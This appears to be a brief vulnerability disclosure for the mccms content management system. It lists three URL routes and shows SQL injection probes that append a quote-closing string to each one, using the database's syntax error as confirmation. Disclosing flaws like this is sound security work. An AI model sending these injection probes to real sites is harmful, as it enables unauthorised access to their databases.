# cve
mccms Vulnerability analysis
How to use black box testing

After testing, the following three URLs are the places for data interaction
http://ip/category/order/hits/copyright/46/finish/1/list/
http://ip/category/order/hits/city/42/copyright/46/finish/1/list/
http://ip/category/order/addtime/city/42/copyright/46/finish/1/list/

By letting the database report an error to determine whether there is SQL injection, we try to use character closure

http://ip/category/order/hits/copyright/46/finish/1/list/1'"1
http://ip/category/order/hits/city/42/copyright/46/finish/1/list/1'"1
http://ip/category/order/addtime/city/42/copyright/46/finish/1/list/1'"1
Determine the existence of SQL injection through the page echo You have an error in your SQL syntax

The open source address of mccms is https://github.com/chshcms/mccms

